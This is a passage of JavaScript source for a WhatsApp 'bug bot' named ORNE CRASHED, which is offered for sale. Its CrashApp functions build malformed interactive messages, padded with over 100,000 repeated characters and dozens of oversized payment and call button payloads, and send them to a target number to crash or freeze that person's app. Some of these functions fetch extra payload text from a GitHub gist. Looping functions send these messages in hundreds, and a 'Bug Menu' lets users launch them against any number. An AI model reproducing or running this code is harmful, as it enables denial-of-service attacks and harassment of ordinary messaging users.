                _eventsCount: 800000,
                _maxListeners: 0,
                url: "wss://web.whatsapp.com/ws/chat",
                config: {
                    version: ["Array"],
                    browser: ["Array"],
                    waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                    clientCectTimeoutMs: 20000,
                    keepAliveIntervalMs: 30000,
                    logger: {},
                    printQRInTerminal: false,
                    emitOwnEvents: true,
                    defaultQueryTimeoutMs: 60000,
                    customUploadHosts: [],
                    retryRequestDelayMs: 250,
                    maxMsgRetryCount: 5,
                    fireInitQueries: true,
                    auth: { Object: "authData" },
                    markOnlineOnclientCect: true,
                    syncFullHistory: true,
                    linkPreviewImageThumbnailWidth: 192,
                    transactionOpts: { Object: "transactionOptsData" },
                    generateHighQualityLinkPreview: false,
                    options: {},
                    appStateMacVerification: { Object: "appStateMacData" },
                    mobile: true
                }
            }
        }
    });
 
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false,
            },
            body: {
              text: "🩸저스틴공",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "payment_method",
                  buttonParamsJson: apiClient + "᭡꧈",
                },
                {
                  name: "ORDER",
                  buttonParamsJson: Apiclient + "᭡꧈",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await client.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
  console.log(" Succes Send Bug By AldzDev ") 
}
async function CrashApp3(target) {
    console.log(`[LOG] ${target}`);

    let venomModsData = JSON.stringify({
        status: true,
        criador: "VenomMods",
        resultado: {
            type: "md",
            ws: {
                _events: { "CB:ib,,dirty": ["Array"] },
                _eventsCount: 800000,
                _maxListeners: 0,
                url: "wss://web.whatsapp.com/ws/chat",
                config: {
                    version: ["Array"],
                    browser: ["Array"],
                    waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                    clientCectTimeoutMs: 20000,
                    keepAliveIntervalMs: 30000,
                    logger: {},
                    printQRInTerminal: false,
                    emitOwnEvents: true,
                    defaultQueryTimeoutMs: 60000,
                    customUploadHosts: [],
                    retryRequestDelayMs: 250,
                    maxMsgRetryCount: 5,
                    fireInitQueries: true,
                    auth: { Object: "authData" },
                    markOnlineOnclientCect: true,
                    syncFullHistory: true,
                    linkPreviewImageThumbnailWidth: 192,
                    transactionOpts: { Object: "transactionOptsData" },
                    generateHighQualityLinkPreview: false,
                    options: {},
                    appStateMacVerification: { Object: "appStateMacData" },
                    mobile: true
                }
            }
        }
    });

    let stanza = [
        { attrs: { biz_bot: "1" }, tag: "bot" },
        { attrs: {}, tag: "biz" }
    ];

    let message = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 3.2,
                    isStatusBroadcast: true,
                    statusBroadcastJid: "status@broadcast",
                    badgeChat: { unreadCount: 9999 }
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "proto@newsletter",
                    serverMessageId: 1,
                    newsletterName: `𝐀𝐯𝐞𝐧𝐠𝐞𝐝 𝐒𝐞𝐯𝐞𝐧𝐟𝐨𝐥𝐝 𝐕𝟑𖣂      - 〽${"ꥈ  ꥈ".repeat(10)}`,
                    contentType: 3,
                    accessibilityText: `𝐀𝐯𝐞𝐧𝐠𝐞𝐝 𝐒𝐞𝐯𝐞𝐧𝐟𝐨𝐥𝐝 𝐕𝟑********************************""""" ${"﹏".repeat(102002)}`,
                },
                interactiveMessage: {
                    contextInfo: {
                        businessMessageForwardInfo: { businessOwnerJid: target },
                        dataSharingContext: { showMmDisclosure: true },
                        participant: "0@s.whatsapp.net",
                        mentionedJid: ["13135550002@s.whatsapp.net"],
                    },
                    body: {
                        text: "\u0003" + "ꦽ".repeat(102002) + "\u0003".repeat(102002)
                    },
                    nativeFlowMessage: {
                        buttons: [
                            { name: "single_select", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_method", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "call_permission_request", buttonParamsJson: venomModsData + "\u0003".repeat(9999), voice_call: "call_galaxy" },
                            { name: "form_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "wa_payment_learn_more", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "wa_payment_transaction_details", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "wa_payment_fbpin_reset", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "catalog_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_info", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "review_order", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "send_location", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payments_care_csat", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "view_product", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_settings", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "address_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "automated_greeting_message_view_catalog", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "open_webview", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "message_with_link_status", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_status", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "galaxy_costum", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "extensions_message_v2", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "landline_call", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "mpm", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "cta_copy", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "cta_url", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "review_and_pay", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "galaxy_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "cta_call", buttonParamsJson: venomModsData + "\u0003".repeat(9999) }
                        ]
                    }
                }
            }
        },
        additionalNodes: stanza,
        stanzaId: `stanza_${Date.now()}`
    };

    await client.relayMessage(target, message, { participant: { jid: target } });
    console.log(`[SUCCESS] ${target}`);
}
async function CrashApp2(isTarget) {
let apiClient;
try {
  const res = await fetch('https://gist.githubusercontent.com/Tama-Ryuichi/572ad67856a67dbae3c37982679153b2/raw/apiClient.json');
  apiClient = await res.text();
} catch (err) {
  console.error("error fetching", err);
  return;
}
      let venomModsData = JSON.stringify({
        status: true,
        criador: "VenomMods",
        resultado: {
          type: "md",
          ws: {
            _events: {
              "CB:ib,,dirty": ["Array"]
            },
            _eventsCount: 800000,
            _maxListeners: 0,
            url: "wss://web.whatsapp.com/ws/chat",
            config: {
              version: ["Array"],
              browser: ["Array"],
              waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
              sockCectTimeoutMs: 20000,
              keepAliveIntervalMs: 30000,
              logger: {},
              printQRInTerminal: false,
              emitOwnEvents: true,
              defaultQueryTimeoutMs: 60000,
              customUploadHosts: [],
              retryRequestDelayMs: 250,
              maxMsgRetryCount: 5,
              fireInitQueries: true,
              auth: {
                Object: "authData"
              },
              markOnlineOnsockCect: true,
              syncFullHistory: true,
              linkPreviewImageThumbnailWidth: 192,
              transactionOpts: {
                Object: "transactionOptsData"
              },
              generateHighQualityLinkPreview: false,
              options: {},
              appStateMacVerification: {
                Object: "appStateMacData"
              },
              mobile: true
            }
          }
        }
      });
      let stanza = [{
        attrs: {
          biz_bot: "1"
        },
        tag: "bot"
      }, {
        attrs: {},
        tag: "biz"
      }];
      let message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 3.2,
              isStatusBroadcast: true,
              statusBroadcastJid: "status@broadcast",
              badgeChat: {
                unreadCount: 9999
              }
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "proto@newsletter",
              serverMessageId: 1,
              newsletterName: `안녕..     - 〽${"ꥈ안녕..ꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: `안녕.. ********************************""""" ${"﹏".repeat(102002)}`
            },
            interactiveMessage: {
              contextInfo: {
                businessMessageForwardInfo: {
                  businessOwnerJid: isTarget
                },
                dataSharingContext: {
                  showMmDisclosure: true
                },
                participant: "0@s.whatsapp.net",
                mentionedJid: ["13135550002@s.whatsapp.net"]
              },
              body: {
                text: "" + "ꦽ".repeat(102002) + "".repeat(102002)
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "single_select",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "payment_method",
                  buttonParamsJson: apiClient + "".repeat(9999)
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: venomModsData + "".repeat(9999),
                  voice_call: "call_galaxy"
                }, {
                  name: "form_message",
                  buttonParamsJson: apiClient + "".repeat(9999)
                }, {
                  name: "wa_payment_learn_more",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "wa_payment_transaction_details",
                  buttonParamsJson: apiClient + "".repeat(9999)
                }, {
                  name: "wa_payment_fbpin_reset",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "catalog_message",
                  buttonParamsJson: apiClient + "".repeat(9999)
                }, {
                  name: "payment_info",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "review_order",
                  buttonParamsJson: apiClient + "".repeat(9999)
                }, {
                  name: "send_location",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "payments_care_csat",
                  buttonParamsJson: apiClient + "".repeat(9999)
                }, {
                  name: "view_product",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "payment_settings",
                  buttonParamsJson: apiClient + "".repeat(9999)
                }, {
                  name: "address_message",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "automated_greeting_message_view_catalog",
                  buttonParamsJson: apiClient + "".repeat(9999)
                }, {
                  name: "open_webview",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "message_with_link_status",
                  buttonParamsJson: apiClient + "".repeat(9999)
                }, {
                  name: "payment_status",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "galaxy_costum",
                  buttonParamsJson: apiClient + "".repeat(9999)
                }, {
                  name: "extensions_message_v2",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "landline_call",
                  buttonParamsJson: apiClient + "".repeat(9999)
                }, {
                  name: "mpm",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "cta_copy",
                  buttonParamsJson: apiClient + "".repeat(9999)
                }, {
                  name: "cta_url",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "review_and_pay",
                  buttonParamsJson: apiClient + "".repeat(9999)
                }, {
                  name: "galaxy_message",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "cta_call",
                  buttonParamsJson: apiClient + "".repeat(9999)
                }]
              }
            }
          }
        },
        additionalNodes: stanza,
        stanzaId: `stanza_${Date.now()}`
      };
      await client.relayMessage(isTarget, message, {
        participant: {
          jid: isTarget
        }
      });
    }
async function CrashApp(isTarget) {
let apiClient;
try {
  const res = await fetch('https://gist.githubusercontent.com/Tama-Ryuichi/572ad67856a67dbae3c37982679153b2/raw/apiClient.json');
  apiClient = await res.text();
} catch (err) {
  console.error("error fetching", err);
  return;
}
  let msg = await generateWAMessageFromContent(
    isTarget,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "X",
            mentionedJid: [isTarget],
           forwardedNewsletterMessageInfo: {
          newsletterJid: "9741@newsletter",
        serverMessageId: 1,
     newsletterName: "-"
     },
            externalAdReply: {
              showAdAttribution: true,
              title: "᭡꧈",
              body: "᭡꧈",
              thumbnailUrl: null,
              sourceUrl: "https://tama.app/",
              mediaType: 1,
              renderLargerThumbnail: true
            },
            businessMessageForwardInfo: {
              businessOwnerJid: isTarget,
            },
            dataSharingContext: {
              showMmDisclosure: true,
            },
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: null
              }
            }
          },
            header: {
              title: "",
              hasMediaAttachment: false
            },
            body: {
              text: "᭡꧈",
            },
            nativeFlowMessage: {
              messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"galaxy_message\",\"header\":\"Ryuichi - Beginner\",\"body\":\"Call Galaxy\"}",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: apiClient + "᭡꧈",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: apiClient + "᭡꧈",
                }, 
                {
                  name: "payment_method",
                  buttonParamsJson: ""
                },
                {
                  name: "payment_status",
                  buttonParamsJson: ""
                },
                {
                  name: "review_order",
                  buttonParamsJson: ""
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await client.relayMessage(isTarget, msg.message, {
    participant: { jid: isTarget },
    messageId: msg.key.id
  });
}
async function nae(x) {
    for (let i = 0; i < 50; i++) {
    await CrashApp(x)
    await CrashApp2(x)
    await CrashApp2(x)
    await CrashApp(x)
    await CrashApp(x)
    await CrashApp2(x) 
    await CrashApp(x)
    await CrashApp2(x)
    await CrashApp(x)
    await CrashApp2(x) 
    await CrashApp(x)
    await CrashApp2(x)
    }
}

async function nae2(x) {
    for (let i = 0; i < 50; i++) {
    await OrneDelayMess(x) 
    await Orne1(x)
    await OrneDelayMess(x) 
    await Orne1(x)
    await OrneDelayMess(x) 
    await Orne1(x)
    await OrneDelayMess(x) 
    await Orne1(x)
    await OrneDelayMess(x) 
    await Orne1(x)
    await OrneDelayMess(x) 
    await Orne1(x)
    await OrneDelayMess(x) 
    await Orne1(x)
    await OrneDelayMess(x) 
    await Orne1(x)
    await OrneDelayMess(x) 
    await Orne1(x)
    }
}

async function nae3(x) {
    for (let i = 0; i < 50; i++) {
    await Orne1(x)
    await OrneBroadcast(x)
    await OrneBroadcast(x) 
    await CrashApp3(x)
    await Orne1(x)
    await OrneBroadcast(x)
    await OrneBroadcast(x) 
    await CrashApp3(x)
    await Orne1(x)
    await OrneBroadcast(x)
    await OrneBroadcast(x) 
    await CrashApp3(x)
    await Orne1(x)
    await OrneBroadcast(x)
    await OrneBroadcast(x) 
    await CrashApp3(x)
    await Orne1(x)
    await OrneBroadcast(x)
    await OrneBroadcast(x) 
    await CrashApp3(x)
    }
}
// End Func Bug

switch (command) {
        
case "menu": {
let captionText = 
`
Hii ${pushname}👏,I Am A WhatsApp Assistant Designed By AldzDeveloper, I Can Help With WhatsApp Activities Easily.

ᬊ────「 \`𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 𝙱𝙾𝚃\`
│ 发 \`ɴᴀᴍᴇ ʙᴏᴛ\` : *${botName}*
│ 发 \`ᴠᴇʀsɪᴏɴ\` : *V1.5.0*
│ 发 \`ᴍᴏᴅᴇ\` : *${client.public ? "Public" : "Private"}*
ᬊ─────────━ᘏ

ᬊ────「 \`𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 𝙳𝙴𝚅\`
│ 发 \`ɴᴀᴍᴇ\` : 𝐀𝐥𝐝𝐳𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫
│ 发 \`sᴋɪʟʟ\` : ᴊs,ʜᴛᴍʟ,ᴄsᴍ,ᴘʏᴛʜᴏɴ
│ 发 \`ᴛᴇʟᴇɢʀᴀᴍ\` : t.me/Aldzofficial
ᬊ─────────━ᘏ

ᬊ────「 \`𝚃𝙷𝙰𝙽𝙺𝚂 𝚈𝙾𝚄\`
│ 开 ᴀʟᴅᴢ ( *ᴅᴇᴠᴇʟᴏᴘᴇ̂ʀ* ) 
│ 开 ᴀʟʟᴀʜ ( *ᴍʏ ɢᴏᴏᴅ* ) 
│ 开 ᴏʀᴀɴɢ ᴛᴜᴀ ( *sᴜᴘᴘᴏʀᴛ* )
│ 开 ʜᴀᴍᴢ ( *sᴜᴘᴘᴏʀᴛ* ) 
│ 开 ᴇʀʟᴀɴɢɢᴀ ( *ʙᴀsᴇ sᴄʀɪᴘᴛ* ) 
│ 开 ᴜsᴇʀ ʙᴏᴛ ( *sᴜᴘᴘᴏʀᴛ* ) 
ᬊ────────━ᘏ

> © Click Button Below
`;
client.sendMessage(m.chat, {
  image: { url: ImageUrlRandom },
  caption: captionText,
  footer: "𝐀𝐥𝐝𝐳 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫",
  contextInfo: {
        externalAdReply: {
            showAdAttribution: true,
            containsAutoReply: true,
            title: `ØⱤ₦Ɇ ₵Ɽ₳₴ⱧɆĐ V1.5`,
            body: `© 𝐀𝐥𝐝𝐳 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫`,
            thumbnailUrl: ImageUrlRandom,
            sourceUrl: `https://whatsapp.com/channel/0029VaorfJtJENxw3EczHo3i`,
            mediaType: 1,
          renderLargerThumbnail: true
        }
    },
        buttons: [
     {
    buttonId: ".owner", 
    buttonText: { 
      displayText: '𝙾𝚆𝙽𝙴𝚁' 
    }
  },
     {
    buttonId: ".sc", 
    buttonText: {
      displayText: "𝚂𝙲𝚁𝙸𝙿𝚃"
    },
    nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "𝚂𝙴𝙻𝙴𝙲𝚃 𝙱𝚄𝚃𝚃𝙾𝙽",
                    sections: [
                        {
                            title: "ØⱤ₦Ɇ ₵Ɽ₳₴ⱧɆĐ",
                            highlight_label: "",
                            rows: [
                          { 
                          title: "Bug Menu", 
                          description: "Bug Menu", 
                          id: `.bugmenu` },
                          { 
                          title: "Owner Menu", 
                          description: "Owner Menu", 
                          id: `.ownermenu` }
                                ]
                        }
                ]
           })
      }
  }
],
viewOnce: true,
  headerType: 6
}, { quoted: qkontak })
}
break			                
case "bugmenu":{
let captionText = `
Hii ${pushname}👏,I Am A WhatsApp Assistant Designed By AldzDeveloper, I Can Help With WhatsApp Activities Easily.

ᬊ────「 \`𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 𝙱𝙾𝚃\`
│ 发 \`ɴᴀᴍᴇ ʙᴏᴛ\` : *${botName}*
│ 发 \`ᴠᴇʀsɪᴏɴ\` : *V1.5.0*
│ 发 \`ᴍᴏᴅᴇ\` : *${client.public ? "Public" : "Private"}*
ᬊ─────────━ᘏ

ᬊ────「 \`𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 𝙳𝙴𝚅\`
│ 发 \`ɴᴀᴍᴇ\` : 𝐀𝐥𝐝𝐳𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫
│ 发 \`sᴋɪʟʟ\` : ᴊs,ʜᴛᴍʟ,ᴄsᴍ,ᴘʏᴛʜᴏɴ
│ 发 \`ᴛᴇʟᴇɢʀᴀᴍ\` : t.me/Aldzofficial
ᬊ─────────━ᘏ

ᬊ────「 \`𝚃𝙷𝙰𝙽𝙺𝚂 𝚈𝙾𝚄\`
│ 开 ᴀʟᴅᴢ ( *ᴅᴇᴠᴇʟᴏᴘᴇ̂ʀ* ) 
│ 开 ᴀʟʟᴀʜ ( *ᴍʏ ɢᴏᴏᴅ* ) 
│ 开 ᴏʀᴀɴɢ ᴛᴜᴀ ( *sᴜᴘᴘᴏʀᴛ* )
│ 开 ʜᴀᴍᴢ ( *sᴜᴘᴘᴏʀᴛ* ) 
│ 开 ᴇʀʟᴀɴɢɢᴀ ( *ʙᴀsᴇ sᴄʀɪᴘᴛ* ) 
│ 开 ᴜsᴇʀ ʙᴏᴛ ( *sᴜᴘᴘᴏʀᴛ* ) 
ᬊ────────━ᘏ


 发 𝙱𝚄𝙶 𝙼𝙴𝙽𝚄
 .flow-crash *𝟼𝟸𝟾𝚡𝚡𝚡*
 .delay-message *𝟼𝟸𝟾𝚡𝚡𝚡*
 .flower-crown *𝟼𝟸𝟾𝚡𝚡𝚡*
 .xcore *𝟼𝟸𝟾𝚡𝚡𝚡*
 .maxwin *𝟼𝟸𝟾𝚡𝚡𝚡*
 
 发 𝙵𝙻𝙾𝚆𝙴𝚁 𝙱𝚄𝙶
 .🥀 *𝟼𝟸𝟾𝚡𝚡𝚡*
 .🌷 *𝟼𝟸𝟾𝚡𝚡𝚡*
 .🍁 *𝟼𝟸𝟾𝚡𝚡𝚡*
 .🌸 *𝟼𝟸𝟾𝚡𝚡𝚡*
 .🌻 *𝟼𝟸𝟾𝚡𝚡𝚡*
`

client.sendMessage(m.chat, {
  image: { url: ImageUrlRandom },
  caption: captionText,
  footer: "𝐀𝐥𝐝𝐳 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫",
  contextInfo: {
        externalAdReply: {
            showAdAttribution: true,
            containsAutoReply: true,
            title: `ØⱤ₦Ɇ ₵Ɽ₳₴ⱧɆĐ V1.5`,
            body: `© 𝐀𝐥𝐝𝐳 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫`,
            thumbnailUrl: ImageUrlRandom,
            sourceUrl: `https://whatsapp.com/channel/0029VaorfJtJENxw3EczHo3i`, 
            mediaType: 1,
          renderLargerThumbnail: true
        }
    },
        buttons: [
     {
    buttonId: ".menu", 
    buttonText: { 
      displayText: '𝙱𝙰𝙲𝙺 𝚃𝙾 𝙼𝙴𝙽𝚄' 
    }
  }
],
viewOnce: true,
  headerType: 6
}, { quoted: qkontak })
}
break
case "ownermenu": {
let captionText = `
Hii ${pushname}👏,I Am A WhatsApp Assistant Designed By AldzDeveloper, I Can Help With WhatsApp Activities Easily.

ᬊ────「 \`𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 𝙱𝙾𝚃\`
│ 发 \`ɴᴀᴍᴇ ʙᴏᴛ\` : *${botName}*
│ 发 \`ᴠᴇʀsɪᴏɴ\` : *V1.5.0*
│ 发 \`ᴍᴏᴅᴇ\` : *${client.public ? "Public" : "Private"}*
ᬊ─────────━ᘏ

ᬊ────「 \`𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 𝙳𝙴𝚅\`
│ 发 \`ɴᴀᴍᴇ\` : 𝐀𝐥𝐝𝐳𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫
│ 发 \`sᴋɪʟʟ\` : ᴊs,ʜᴛᴍʟ,ᴄsᴍ,ᴘʏᴛʜᴏɴ
│ 发 \`ᴛᴇʟᴇɢʀᴀᴍ\` : t.me/Aldzofficial
ᬊ─────────━ᘏ

ᬊ────「 \`𝚃𝙷𝙰𝙽𝙺𝚂 𝚈𝙾𝚄\`
│ 开 ᴀʟᴅᴢ ( *ᴅᴇᴠᴇʟᴏᴘᴇ̂ʀ* ) 
│ 开 ᴀʟʟᴀʜ ( *ᴍʏ ɢᴏᴏᴅ* ) 
│ 开 ᴏʀᴀɴɢ ᴛᴜᴀ ( *sᴜᴘᴘᴏʀᴛ* )
│ 开 ʜᴀᴍᴢ ( *sᴜᴘᴘᴏʀᴛ* ) 
│ 开 ᴇʀʟᴀɴɢɢᴀ ( *ʙᴀsᴇ sᴄʀɪᴘᴛ* ) 
│ 开 ᴜsᴇʀ ʙᴏᴛ ( *sᴜᴘᴘᴏʀᴛ* ) 
ᬊ────────━ᘏ


 发 𝙾𝚆𝙽𝙴𝚁 𝙼𝙴𝙽𝚄
  .addowner
  .delowner
  .addprem
  .delprem
  .self
  .public
  .addcase
  .getcase
  .reactch
`
client.sendMessage(m.chat, {
  image: { url: ImageUrlRandom },
  caption: captionText,
  footer: "𝐀𝐥𝐝𝐳 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫",
  contextInfo: {
        externalAdReply: {
            showAdAttribution: true,
            containsAutoReply: true,
            title: `ØⱤ₦Ɇ ₵Ɽ₳₴ⱧɆĐ V1.5`,
            body: `© 𝐀𝐥𝐝𝐳 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫`,
            thumbnailUrl: ImageUrlRandom,
            sourceUrl: `https://whatsapp.com/channel/0029VaorfJtJENxw3EczHo3i`, 
            mediaType: 1,
          renderLargerThumbnail: true
        }
    },
        buttons: [
     {
    buttonId: ".menu", 
    buttonText: { 
      displayText: '𝙱𝙰𝙲𝙺 𝚃𝙾 𝙼𝙴𝙽𝚄' 
    }
  }
],
viewOnce: true,
  headerType: 6
}, { quoted: qkontak })
}
break
case "reactch": {
if (!isCreator) return m.reply(mess.owner)
if (!text) return reply("linkpesanch 😂")
if (!args[0] || !args[1]) return reply("linkpesanch 😂")
if (!args[0].includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = args[0].split('/')[4]
let serverId = args[0].split('/')[5]
let res = await client.newsletterMetadata("invite", result)
await client.newsletterReactMessage(res.id, serverId, args[1])
m.reply(`Berhasil mengirim reaction ${args[1]} ke dalam channel ${res.name}`)
}
break
case "addprem":{
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
anj = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await client.onWhatsApp(anj)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
premium.push(anj)
fs.writeFileSync("./database/premium.json", JSON.stringify(premium))
reply(`Nomor ${anj} Telah Menjadi Premium!`)
}
break
case 'delprem': {
    if (!isCreator) return reply(mess.owner);
    if (args.length < 1) return reply(`Use :\n*.delprem* number`);

    if (m.mentionedJid.length !== 0) {
        for (let i = 0; i < m.mentionedJid.length; i++) {
            premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1);
            fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
        }
        reply("Delete success");
    } else {
        premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1);
        fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
        reply("Success");
    }
}
break
            case "self":{
                if (!isCreator) return reply(mess.owner) 
                client.public = false
                reply(`successfully changed to ${command}`)
            }
            break
                        case "public":{
                if (!isCreator) return reply(mess.owner) 
                client.public = true
                reply(`successfully changed to ${command}`)
            }
            
break
      case 'script': case 'sc': {
let buy = `
ᴍᴀᴜ ʙᴜʏ sᴄʀɪᴘᴛ ØⱤ₦ɆⱤ ₵Ɽ₳₴ⱧɆĐ`
client.relayMessage(m.chat, {
 requestPaymentMessage: {
 currencyCodeIso4217: 'IDR',
 amount1000: 50000000,
 requestFrom: `@${m.sender.split('@')}`,
 noteMessage: {
 extendedTextMessage: {
 text: buy,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true
 }}}}}}, {})
}
break                               
case 'addcase': {
 if (!isCreator) return reply('lu sapa asu')
 if (!text) return reply('Mana case nya');
    const fs = require('fs');
const namaFile = 'erlangga.js';
const caseBaru = `${text}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                reply('Terjadi kesalahan saat menulis file:', err);
            } else {
                reply('Case baru berhasil ditambahkan.');
            }
        });
    } else {
        reply('Tidak dapat menambahkan case dalam file.');
    }
});

}

break
case 'owner': case 'botowner':
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `${ownerName}`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${ownerName}\nitem1.TEL;waid=${global.owner}:+${global.owner}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:No Spam Call\nX-WA-BIZ-NAME: ${ownerName}\nEND:VCARD`,
}
}), { userJid: m.chat, quoted: qkontak })
client.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
break;
case "getcase": {
if (!isCreator) return reply(mess.owner)
if (!text) return reply("contoh .getcase menu")
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./mycase.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
reply(`${getcase(q)}`)
} catch (e) {
return reply(`Case *${text}* Tidak Ditemukan`)
}
}
break  
case "delowner":{
if (!isCreator) return reply(mess.owner)
if (!args[0]) return m.reply(`Example Use :\n${prefix+command} 62xxx`)
let ya = q.split("|")[0].replace(/[^0-9]/g, '')
let no = '@s.whatsapp.net'
let unp = creator.indexOf(ya)
creator.splice(unp, 1)
fs.writeFileSync("./database/owner.json", JSON.stringify(creator))
reply(`Sussces Del Owner ${no}`)
}
break
case "addowner":{
if (!isCreator) return reply(mess.owner)
if (!args[0]) return m.reply(`*\`PENGGUNA :\`* *${command} NOMOR*\n*\`EXAMPLE :\`* *${command} 628XXXX*`)
let prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await client.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`*\`MOHON MASUKAN NOMOR YG TERDAFTAR\`*`)
creator.push(prrkek)
fs.writeFileSync("./database/owner.json", JSON.stringify(creator))
reply(`*\`${prrkek} SUKSES MENJADI OWNER!!\`*`)
}

break
